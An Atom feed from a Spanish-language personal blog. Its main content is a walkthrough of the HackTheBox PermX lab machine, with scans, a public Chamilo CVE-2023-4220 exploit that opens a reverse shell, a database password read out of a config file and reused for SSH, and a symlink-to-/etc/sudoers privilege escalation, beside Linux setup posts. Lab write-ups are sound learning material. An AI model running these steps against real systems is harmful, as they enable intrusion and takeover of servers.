<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-25T18:14:19-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BlogPersonal</title><subtitle>post de proyectos</subtitle><author><name>Eduardo Rivera</name></author><entry><title type="html">Máquina GreenHorn de HackTheBox con dificultad fácil</title><link href="http://localhost:4000/hackthebox/Maquina-GreenHorn/" rel="alternate" type="text/html" title="Máquina GreenHorn de HackTheBox con dificultad fácil" /><published>2024-07-23T00:00:00-06:00</published><updated>2024-07-23T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/Maquina-GreenHorn</id><content type="html" xml:base="http://localhost:4000/hackthebox/Maquina-GreenHorn/"><![CDATA[<h2 id="próximamente">Próximamente…</h2>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="pixelated" /><category term="pluck 4.7.18" /><summary type="html"><![CDATA[La máquina GreenHorn nos muestra las posibilidades de encontrar contraseñas incluso cuando están ocultas en una imagen. Aunque esta máquina en sí misma no representa un gran desafío, el proceso para descubrir la contraseña resulta ser bastante interesante y educativo.]]></summary></entry><entry><title type="html">Instalación, configuración y personalización de ArchLinux.</title><link href="http://localhost:4000/linux/ArchLinux/" rel="alternate" type="text/html" title="Instalación, configuración y personalización de ArchLinux." /><published>2024-07-19T00:00:00-06:00</published><updated>2024-07-19T00:00:00-06:00</updated><id>http://localhost:4000/linux/ArchLinux</id><content type="html" xml:base="http://localhost:4000/linux/ArchLinux/"><![CDATA[<h2 id="arch-linux">Arch Linux</h2>

<p style="text-align: justify;">
    <img src="/assets/images/ArchLinux/icons8-arch-linux-480.png" style="float: left; margin: 0 5px 0 0; width: 90px; height: auto;" />
    Arch Linux es una distribución de Linux de propósito general x86-64 desarrollada de forma independiente. Se esfuerza por proporcionar las últimas versiones estables de la mayoría del software, siguiendo un modelo de rolling-release. La instalación por defecto es intencionadamente mínima para que los usuarios puedan añadir solo los paquetes que necesiten.
</p>

<p style="text-align: justify;">
En este post se abordará la instalación de manera sencilla y la explicación de ciertos detalles que hay que tomar en cuenta a la hora de instalar el sistema. Una mala configuración y/o instalación puede terminar dañando las particiones si se está instalando junto con algún otro sistema operativo.
</p>

<h2 id="descarga">Descarga</h2>
<p>Para descargar Arch Linux, es necesario hacerlo desde su página oficial. No hay un enlace directo para descargar la ISO; en su lugar, se deben utilizar los enlaces Torrent o Magnet.</p>

<p><a href="https://archlinux.org/download/">Descarga de ArchLinux</a></p>

<p>Podemos ver los enlaces mencionados anteriormente en el apartado <strong>BitTorrent Download (recommended)</strong>:</p>

<p align="center">
<img src="/assets/images/ArchLinux/ArchPagina.png" />
</p>

<p>En este caso se descargo la version de Torrent, para poder descargar este archivo se puede usar <a href="https://www.utorrent.com/">uTorrent</a> para Windows o <strong>qBittorrent</strong> para Linux</p>

<p align="center">
<img src="/assets/images/ArchLinux/utorret.png" />
</p>

<h2 id="continuara">Continuara…</h2>]]></content><author><name>Eduardo Rivera</name></author><category term="Linux" /><category term="Linux" /><category term="Personalización" /><summary type="html"><![CDATA[Nos sumergimos en la instalación de Arch Linux, un proceso que puede parecer un gran reto al principio, pero que en realidad es muy sencillo. Además, la personalización del sistema abre un mundo de posibilidades, permitiéndote adaptar cada detalle a tus necesidades y preferencias.]]></summary></entry><entry><title type="html">Máquina PermX de HackTheBox con dificultad fácil</title><link href="http://localhost:4000/hackthebox/permx/" rel="alternate" type="text/html" title="Máquina PermX de HackTheBox con dificultad fácil" /><published>2024-07-12T00:00:00-06:00</published><updated>2024-07-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/permx</id><content type="html" xml:base="http://localhost:4000/hackthebox/permx/"><![CDATA[<h3 id="recocimiento">Recocimiento</h3>
<p>Esta máquina está clasificada como fácil y no puedo decir lo contrario. Lo primero que se hace es un escaneo usando nmap con la siguiente línea de código:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-oG</span> allPorts 10.10.11.23
</code></pre></div></div>
<p>EEl escaneo nos arrojó que están abiertos dos puertos, el 22 y el 80, algo muy común para un servidor que aloja un servicio web. Para ello, vamos a escanear de manera exhaustiva los puertos con el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> Ports 10.10.11.23
</code></pre></div></div>

<p>Nos arroja la siguiente información:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94SVN scan initiated Thu Jul 11 16:02:33 2024 as: nmap -sCV -p22,80 -oN Ports 10.10.11.23</span>
Nmap scan report <span class="k">for </span>10.10.11.23
Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: Host: 127.0.0.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
</code></pre></div></div>
<p>Debemos agregar al archivo hosts la dirección y su enlace:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
</code></pre></div></div>
<p>En el archivo se agrega lo siguiente:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.23     permx.htb
</code></pre></div></div>
<p>Una vez guardados los cambios, vamos a nuestro navegador y analizamos la página:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina1.png" />
</p>

<p>Navegando en la página, no encontramos nada en lo cual se pueda comenzar un ataque, así que ahora procedemos a usar la herramienta <code class="language-plaintext highlighter-rouge">ffuf</code> para encontrar posibles páginas ocultas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ffuf <span class="nt">-u</span> http://permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 138ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 140ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 226ms]
img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 205ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 160ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 125ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 129ms]
:: Progress: [20476/20476] :: Job [1/1] :: 162 req/sec :: Duration: [0:01:29] :: Errors: 0 ::

</span></code></pre></div></div>

<p>Con el escaneo encontramos diversas páginas:</p>

<ul>
  <li>http://permx.htb/css/</li>
  <li>http://permx.htb/img/</li>
  <li>http://permx.htb/js/</li>
  <li>http://permx.htb/lib/</li>
</ul>

<p>Pero hay un problema: en ninguna de estas se encontró nada interesante, así que procedemos a buscar alguna página asociada o subdominio, es decir, host distinto que un usuario tenga que iniciar sesión. Para ello, vamos a usar fuzz de otra manera.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://permx.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.permx.htb"</span> <span class="nt">-fc</span> 302

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 510ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 270ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</span></code></pre></div></div>
<p>Como podemos ver, encontramos dos subdominios, los cuales son:</p>

<ul>
  <li>http://www.permx.htb/</li>
  <li>http://lms.permx.htb/</li>
</ul>

<p>De estos subdominios, el que realmente es interesante es el segundo (lms.permx.htb), en este podemos encontrar el panel de inicio de sesión el cual usa Chamilo:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina2.png" />
</p>

<p>En esta página podemos encontrar un inicio de sesión. Probamos con credenciales típicas como admin - admin, pero no tiene fallas de ese estilo. Así como en la página anterior vimos que tenía páginas ocultas, procedemos a buscar si esta cuenta con páginas ocultas:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ffuf <span class="nt">-u</span> http://lms.permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt


        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lms.permx.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 220ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 225ms]
LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 164ms]
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 176ms]
bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 290ms]
certificates            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 326ms]
documentation           [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 137ms]
favicon.ico             [Status: 200, Size: 2462, Words: 3, Lines: 2, Duration: 338ms]
main                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 135ms]
plugin                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
robots.txt              [Status: 200, Size: 748, Words: 75, Lines: 34, Duration: 156ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 137ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 156ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 127ms]
web                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 161ms]
:: Progress: [20476/20476] :: Job [1/1] :: 47 req/sec :: Duration: [0:01:38] :: Errors: 0 ::
</span></code></pre></div></div>
<p>De la misma manera que en la página anterior, encontramos las siguientes páginas:</p>

<ul>
  <li>http://lms.permx.htb/LICENSE/</li>
  <li>http://lms.permx.htb/app/</li>
  <li>http://lms.permx.htb/bin/</li>
  <li>http://lms.permx.htb/certificates/</li>
  <li>http://lms.permx.htb/documentation/</li>
  <li>http://lms.permx.htb/favicon.ico/</li>
  <li>http://lms.permx.htb/main/</li>
  <li>http://lms.permx.htb/plugin/</li>
  <li>http://lms.permx.htb/robots.txt/</li>
  <li>http://lms.permx.htb/src/</li>
  <li>http://lms.permx.htb/vendor/</li>
  <li>http://lms.permx.htb/web/</li>
</ul>

<p>Si bien encontramos una variedad de enlaces, ninguno de estos es realmente relevante, ya que, a pesar de encontrar información, esta no es de utilidad ni muestra alguna brecha de seguridad aparente. Así que nos queda investigar si la versión de Chamilo que se utilizó en la página web tiene alguna vulnerabilidad. Para ello, podemos verla en el enlace http://lms.permx.htb/documentation/, el cual nos muestra la siguiente información:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina3.png" />
</p>

<p>Podemos observar que la versión utilizada es Chamilo 1.11. Después de una investigación, hallamos que sí tiene una vulnerabilidad, la cual se puede encontrar como:</p>
<ul>
  <li><a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949">CVE-2023-4220</a></li>
</ul>

<p>Esta vulnerabilidad nos dice que:</p>

<ul>
  <li>
    <p>Descripción de la vulnerabilidad</p>

    <p>La carga no restringida de archivos en la funcionalidad de carga de archivos grandes en <code class="language-plaintext highlighter-rouge">/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code> en Chamilo LMS &lt;= v1.11.24 permite a atacantes no autenticados realizar ataques de cross-site scripting almacenados y obtener la ejecución remota de código a través de la carga de web shell.</p>
  </li>
  <li>
    <p>Descripción del riesgo</p>

    <p>Existe el riesgo de que un atacante remoto no autenticado pueda comprometer completamente el servidor para robar información confidencial, instalar ransomware o pivotar a la red interna.</p>
  </li>
  <li>
    <p>Recomendación</p>

    <p>Se recomienda actualizar el software afectado a la última versión, que mitiga esta vulnerabilidad.</p>
  </li>
</ul>

<p>Referencia: <a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949">Chamilo LMS &lt;= 1.11.24 - Remote Code Execution </a></p>

<h3 id="explotacion">Explotacion</h3>
<p>Una vez entendida la vulnerabilidad, procedemos a buscar un exploit o, en su caso, programarlo. Para fines prácticos, se utiliza el siguiente exploit:</p>
<ul>
  <li><a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">Chamilo LMS Unauthenticated Big Upload File RCE PoC</a></li>
</ul>

<p>Clonamos el exploit y accedemos a la carpeta, luego procedemos a ejecutar el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 main.py <span class="nt">-u</span> http://lms.permx.htb/ <span class="nt">-a</span> revshell
</code></pre></div></div>
<p>Antes de ejecutar el comando, debemos estar en otra terminal y asegurarnos de haber ejecutado el siguiente comando para escuchar en el puerto:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> <span class="o">[</span>PORT

<span class="c">#Ejemplo</span>
nc <span class="nt">-nlvp</span> 4444 
</code></pre></div></div>
<p>Si todo fue exitoso, la terminal donde ejecutamos el exploit debería finalizar de la siguiente manera:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina4.png" />
</p>

<p>Y la terminal que estamos escuchando estaria asi:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.59] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.23] 39654
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1186<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files<span class="nv">$ </span>
</code></pre></div></div>

<p>Después de investigar en la máquina, encontramos la siguiente información:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class="nb">ls
</span>add_course.conf.dist.php   course_info.conf.php  profile.conf.dist.php
add_course.conf.php        events.conf.dist.php  profile.conf.php
assetic.yml                events.conf.php       routing.yml
auth.conf.dist.php         fos                   routing_admin.yml
auth.conf.php              ivory_ckeditor.yml   routing_dev.yml
config.yml                 mail.conf.dist.php    routing_front.yml
config_dev.yml             mail.conf.php         security.yml
config_prod.yml            migrations.yml        services.yml
configuration.php          mopa                  sonata
course_info.conf.dist.php  parameters.yml.dist

www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class="nb">cat </span>configuration.php
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="c1">// Chamilo version 1.11.24</span>
<span class="c1">// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000</span>
<span class="cm">/* For licensing terms, see /license.txt */</span>
<span class="cd">/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */</span>

<span class="c1">// Database connection settings.</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_host'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_port'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'3306'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'main_database'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'chamilo'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_user'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'chamilo'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_password'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'03F6lY3uXAP2bkW8'</span><span class="p">;</span>
<span class="c1">// Enable access to database management for platform admins.</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_manager_enabled'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</code></pre></div></div>
<p>En este caso, podemos encontrar una contraseña. Esta contraseña, en primeras instancias, es para iniciar sesión en la base de datos, pero podemos probar si esta contraseña funciona para conectarnos al usuario encontrado. Este usuario lo encontramos al acceder a la carpeta /home/. Ahí podemos ver ese usuario, así que procederemos a intentar iniciar sesión por SSH.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload<span class="nv">$ </span><span class="nb">cd</span> /home
<span class="nb">cd</span> /home
www-data@permx:/home<span class="nv">$ </span><span class="nb">ls
ls
</span>mtz
www-data@permx:/home<span class="nv">$ </span>
</code></pre></div></div>
<p>Para iniciar una conexion ssh procedemos ejecuatar el siguiente comando:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mtz@10.10.11.23
</code></pre></div></div>
<p>una vez iniciado nos pedira la contrasela la cual insertaremos la que encontramos y soprendentemente es la misma contraseña</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina5.png" />
</p>

<p>Como podemos ver solo tenemos acceso a un archivo el cual nos permitira elevar previlegios</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mtz on permx:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User mtz may run the following commands on permx:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /opt/acl.sh
mtz@permx:~<span class="nv">$ </span><span class="nb">cat</span> /opt/acl.sh 
<span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> user perm file"</span>
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">user</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nv">perm</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
<span class="nv">target</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>

<span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">!=</span> /home/mtz/<span class="k">*</span> <span class="o">||</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span>..<span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Access denied."</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Check if the path is a file</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Target must be a file."</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>
</code></pre></div></div>

<p>Procedimiento para elevar previlegios</p>
<p align="center">
<img src="/assets/images/MaquinaPermx/pagina7.png" />
</p>

<p><strong>Explicación</strong></p>

<p>1- Crear un enlace simbólico:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /etc/sudoers symlink
</code></pre></div></div>
<ul>
  <li><strong>ln</strong>: Comando para crear enlaces.</li>
  <li><strong>-s</strong>: Indica que se creará un enlace simbólico (o “symlink”).</li>
  <li><strong>/etc/sudoers</strong>: Archivo original al que se creará el enlace.</li>
  <li><strong>symlink</strong>*: Nombre del nuevo enlace simbólico.
Este comando crea un enlace simbólico llamado symlink que apunta al archivo /etc/sudoers. Los enlaces simbólicos son como atajos que apuntan a otro archivo o directorio.</li>
</ul>

<p>2- Listar archivos con detalles:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
</code></pre></div></div>
<ul>
  <li><strong>ls</strong>: Comando para listar archivos y directorios.</li>
  <li><strong>-l</strong>: Muestra una lista detallada de archivos con permisos, número de enlaces, propietario, grupo, tamaño, fecha de modificación y nombre del archivo.
Este comando mostrará una lista de archivos en el directorio actual, incluida información detallada sobre cada archivo. Entre ellos, se mostrará el enlace simbólico symlink.</li>
</ul>

<p>3- Ejecutar un script con privilegios:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /opt/act.sh mtz rwx /home/mtz/symlink
</code></pre></div></div>
<ul>
  <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
  <li><strong>/opt/act.sh</strong>: Ruta al script que se va a ejecutar.</li>
  <li><strong>mtz rwx /home/mtz/symlink</strong>: Argumentos pasados al script.
Este comando ejecuta el script /opt/act.sh con privilegios elevados, pasando los argumentos mtz, rwx y /home/mtz/symlink. La naturaleza de estos argumentos y el propósito del script dependerá de su contenido.</li>
</ul>

<p>4- Editar un archivo con nano:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /home/mtz/symlink
</code></pre></div></div>
<ul>
  <li><strong>nano</strong>: Editor de texto en la línea de comandos.</li>
  <li><strong>/home/mtz/symlink</strong>: Archivo que se va a editar.
Este comando abre el archivo /home/mtz/symlink en el editor de texto nano. Como symlink es un enlace simbólico que apunta a /etc/sudoers, estarás editando el archivo real /etc/sudoers.</li>
</ul>
<p align="center">
<img src="/assets/images/MaquinaPermx/pagina6.png" />
</p>

<p>5- Cambiar a superusuario:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
</code></pre></div></div>

<ul>
  <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
  <li><strong>su</strong>: Cambia de usuario.
Este comando te cambia al usuario root, dándote acceso completo a todo el sistema</li>
</ul>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="puerto 80" /><category term="nmap" /><summary type="html"><![CDATA[En esta máquina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contraseña en múltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.]]></summary></entry><entry><title type="html">Personalización de un entorno de trabajo Linux.</title><link href="http://localhost:4000/linux/Personalizacion/" rel="alternate" type="text/html" title="Personalización de un entorno de trabajo Linux." /><published>2024-07-09T00:00:00-06:00</published><updated>2024-07-09T00:00:00-06:00</updated><id>http://localhost:4000/linux/Personalizacion</id><content type="html" xml:base="http://localhost:4000/linux/Personalizacion/"><![CDATA[<h1 id="personalización-de-linux">Personalización de Linux</h1>
<p>Instalación de  <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">ZSH</a> para eso vamos a usar el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>zsh
</code></pre></div></div>
<p>Opcionalmente, se puede instalar <a href="https://ohmyz.sh/">oh-my-zsh</a></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh <span class="nt">-c</span> <span class="s2">"</span><span class="si">$(</span>curl <span class="nt">-fsSL</span> https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh<span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>

<h2 id="powerlevel10k">Powerlevel10k</h2>
<p>El tema preferido para la terminal es <a href="https://github.com/romkatv/powerlevel10k">powerlevel10k</a></p>

<p>Guía de instalación.</p>
<ul>
  <li>Fuentes que se deben instalar:
    <ul>
      <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Regular.ttf">MesloLGS NF Regular.ttf</a></li>
      <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Bold.ttf">MesloLGS NF Bold.ttf</a></li>
      <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Italic.ttf">MesloLGS NF Italic.ttf</a></li>
      <li><a href="https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%20NF%20Bold%20Italic.ttf">MesloLGS NF Bold Italic.ttf</a></li>
    </ul>
  </li>
  <li>Instalación
    <ul>
      <li>Manual:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone <span class="nt">--depth</span><span class="o">=</span>1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
  <span class="nb">echo</span> <span class="s1">'source ~/powerlevel10k/powerlevel10k.zsh-theme'</span> <span class="o">&gt;&gt;</span>~/.zshrc
</code></pre></div>        </div>
      </li>
      <li>Usando Oh My Zsh
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone <span class="nt">--depth</span><span class="o">=</span>1 https://github.com/romkatv/powerlevel10k.git <span class="k">${</span><span class="nv">ZSH_CUSTOM</span><span class="k">:-</span><span class="nv">$HOME</span><span class="p">/.oh-my-zsh/custom</span><span class="k">}</span>/themes/powerlevel10k
</code></pre></div>        </div>
        <p>En el archivo <code class="language-plaintext highlighter-rouge">~/.zshrc</code> se debe agregar el tema en el caso de a ver usado Oh My Zsh <code class="language-plaintext highlighter-rouge">ZSH_THEME="powerlevel10k/powerlevel10k"</code></p>
      </li>
      <li>Para restaurar ZSH se debe usar el siguiente comando:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">exec </span>zsh
</code></pre></div>        </div>
      </li>
